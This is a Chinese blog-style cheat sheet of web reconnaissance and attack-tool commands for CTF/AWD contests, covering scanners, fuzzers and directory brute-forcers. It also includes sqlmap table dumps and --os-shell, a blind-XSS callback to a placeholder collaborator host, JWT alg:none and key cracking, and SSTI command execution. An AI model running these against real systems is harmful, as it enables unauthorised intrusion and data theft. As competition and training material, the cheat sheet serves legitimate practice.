---
title: 工具手册：Web 侦察与扫描
date: 2026-11-20 09:02:00
author: Xendr1a
categories: [工具与运维]
tags: [工具, 侦察]
description: 工具手册：Web 侦察与扫描，按用途与常用参数整理。
toc: true
---

## 02 Web 侦察与扫描

> 顺序建议：`nmap` 看端口 → `whatweb/httpx` 判技术栈 → `katana` 爬路径 → `dirsearch/ffuf/gobuster` 补目录 → `nuclei` 打已知 CVE → `sqlmap/dalfox/fenjing` 验证具体洞。

### nmap（7.95）— 端口与服务

```bash
nmap -sV -T4 HOST                        # 常用：服务版本
nmap -p- -T4 --min-rate 2000 HOST        # 全端口（AWD 只有几台，够）
nmap -sV -p 80,443,8080,3306,6379 HOST
nmap -sV --script http-title,http-headers -p 80 HOST
nmap -Pn -sV HOST                        # 禁 ping 探测时（靶机常禁 ICMP）
nmap -oN scan.txt HOST                   # 存档
```

输出：`PORT STATE SERVICE VERSION`，重点记版本号（判 CVE）。
坑：`-sS` 需要 root，本机用 `-sT`；AWD 不允许打平台，别看错 IP。

### whatweb（0.5.5）— 框架指纹

```bash
whatweb -a 3 http://HOST/                # 详细级别 1-4，3 够用
whatweb -a 3 --color=never http://HOST/ | tr ',' '\n'
```

输出：`Title[xxx], PHP[7.4.3], ThinkPHP[5.0.24], nginx[1.18.0]`。看到 `ThinkPHP 5.0.x`、`Laravel`、`Shiro` 直接翻 CVE 笔记。

### httpx — 批量探活（比 curl 省事）

```bash
httpx -u http://HOST -title -tech-detect -status-code -no-color
httpx -l urls.txt -mc 200,301,302,403 -o alive.txt      # 批量过滤存活
httpx -u http://HOST -path /admin,/api -mc 200,403
httpx -l urls.txt -silent -json | jq -r '.url+" "+(.tech//[]|join(","))'
```

`-mc` 匹配状态码，`-ml` 匹配长度，`-silent` 只输出结果（脚本里必加）。

### katana — 爬虫（含 JS 里的接口）

```bash
katana -u http://HOST/ -d 3 -jc -o urls.txt          # -jc 解析 JS 里的 endpoint
katana -u http://HOST/ -d 2 -kf all -silent          # 顺带抓 robots.txt/sitemap
katana -list urls.txt -d 2 -c 20 -silent | sort -u > all.txt
```

坑：默认有 headless 分支但没装浏览器时会降级；`-d` 别开太大，AWD 里 3 层够了。

### waybackurls — 历史 URL

```bash
waybackurls example.com | sort -u | tee wb.txt
waybackurls example.com | grep -Ei '\.(php|jsp|bak|zip|sql)$'
```

有域名时才有用（AWD 多是 IP，意义不大）。

### ffuf（2.1.0）— 万能 fuzz

```bash
# 目录/文件
ffuf -u http://HOST/FUZZ -w ~/ctf/省赛/wordlists/raft-small-dir.txt -mc 200,301,302,403 -t 30
# 后缀
ffuf -u http://HOST/indexFUZZ -w <(printf '.php\n.php.bak\n.php~\n.swp\n')
# 隐藏 GET 参数（按响应长度过滤）
ffuf -u 'http://HOST/x.php?FUZZ=1' -w ~/ctf/省赛/wordlists/params.txt -fs 1234 -t 30
# POST 参数 fuzz
ffuf -u http://HOST/login.php -X POST -d 'user=admin&FUZZ=1' -w params.txt -fs 456
# 子域名（有域名时）
ffuf -u http://FUZZ.example.com -w subs.txt -mc 200
```

参数：`-mc` 状态码 / `-fs` 过滤长度 / `-fc` 过滤状态码 / `-t` 线程 / `-rate` 每秒请求 / `-o out.json -of json`。
输出里 `Size`/`Words` 两个数字是过滤依据，先用 `-mc all` 跑一遍看基线。

### gobuster（3.6）— 目录爆破

```bash
gobuster dir -u http://HOST/ -w ~/ctf/省赛/wordlists/common.txt -x php,html,txt -t 30
gobuster dir -u http://HOST/ -w raft-small-dir.txt -s 200,204,301,302,307,403 -k
gobuster vhost -u http://HOST -w subs.txt --append-domain
```

`-x` 补后缀（会和服务端目录一起打）、`-k` 忽略证书、`-s` 正的返回码。

### dirsearch（0.5.0）— 一条命令扫目录+备份

```bash
dirsearch -u http://HOST/ -e php,html,js,zip,bak,txt -t 30 -q
dirsearch -u http://HOST/ -e php --exclude-status=404,500 --recursive --force-extensions
dirsearch -u http://HOST/ -w ~/ctf/省赛/wordlists/raft-medium-directories.txt -q -o out.txt
```

坑：默认字典很小；`-q` 静默（脚本用），`--recursive` 会翻倍耗时。

### nuclei（3.11.1）— 模板化打已知漏洞

```bash
nuclei -u http://HOST/ -s critical,high,medium -rl 50          # 按危害级别
nuclei -u http://HOST/ -tags cve,rce,sqli,lfi -rl 50
nuclei -u http://HOST/ -t ~/nuclei-templates/http/cves/2021/ -rl 50
nuclei -l alive.txt -tags exposure,config -o nuclei.out
nuclei -u http://HOST/ -as -rl 50                              # 自动扫描模式
```

模板 14225 个已离线（`~/nuclei-templates`）。`-rl` 限速必加；`-duc` 关更新检查更快。
输出 `[cve-2021-xxxx] [http] [critical] http://HOST/xxx`。

### dalfox — XSS 自动验证

```bash
dalfox url "http://HOST/search?q=1" --skip-bav
dalfox url "http://HOST/x?q=1" --custom-payload ./payloads.txt
cat urls.txt | dalfox pipe --silent
dalfox url "http://HOST/?q=1" --blind https://your-collab   # 盲打回连
```

`--skip-bav` 跳过基础反射检查（更快，误报略多）。

### sqlmap（1.9.6）— SQL 注入

```bash
sqlmap -u "http://HOST/x.php?id=1" --batch --dbs
sqlmap -u "http://HOST/x.php?id=1" --batch -D app -T users --dump
sqlmap -u "http://HOST/x.php?id=1" --batch --os-shell            # 有 DBA 权限时直接落 shell
sqlmap -r req.txt -p id --batch --dbs                            # 用 Burp 存下的请求（带 Cookie/Header）
sqlmap -u "http://HOST/x.php?id=1" --batch --level 3 --risk 2 --technique BEUST
sqlmap -u "http://HOST/x.php?id=1" --batch --tamper=space2comment
```

坑：`-r` 是最常用姿势（登录态、POST、JSON 都能带）；默认会问一堆，脚本里必加 `--batch`；`--os-shell` 依赖写文件权限。

### jwt_tool（`jwt`）— JWT 攻击

```bash
jwt -t http://HOST/ -M at -rh "Authorization: Bearer <token>"     # 全测（alg none/弱密钥/kid…）
jwt -t http://HOST/ -M a  -rh "Authorization: Bearer <token>"     # 只测 alg:none
jwt -t http://HOST/ -M c  -d ~/ctf/省赛/wordlists/common.txt      # 弱密钥爆破
jwt -t http://HOST/ -M pb                                         # playbook 引导
jwt -d <token>                                                    # 只解码看 header/payload
```

### fenjing — SSTI 自动利用

```bash
fenjing crack -u "http://HOST/page" -i name -m GET -e "id"   # -i 参数名必填，-e 成功后执行命令
fenjing crack -u "http://HOST/page" -i name -m POST --cookies "PHPSESSID=x"
fenjing scan -u "http://HOST/"                                # 只扫表单
fenjing crack-keywords -k "{% raw %}{{{% endraw %}" -e "id"                        # 只有回显关键字时
fenjing webui                                                 # 浏览器操作，最直观
```

### 字典（本机唯一一份）

```bash
ls ~/ctf/省赛/wordlists
# common.txt 4751 / raft-small-dir.txt 20115 / raft-medium-directories.txt 29999
# raft-small-files.txt 11424 / params.txt 6453
```
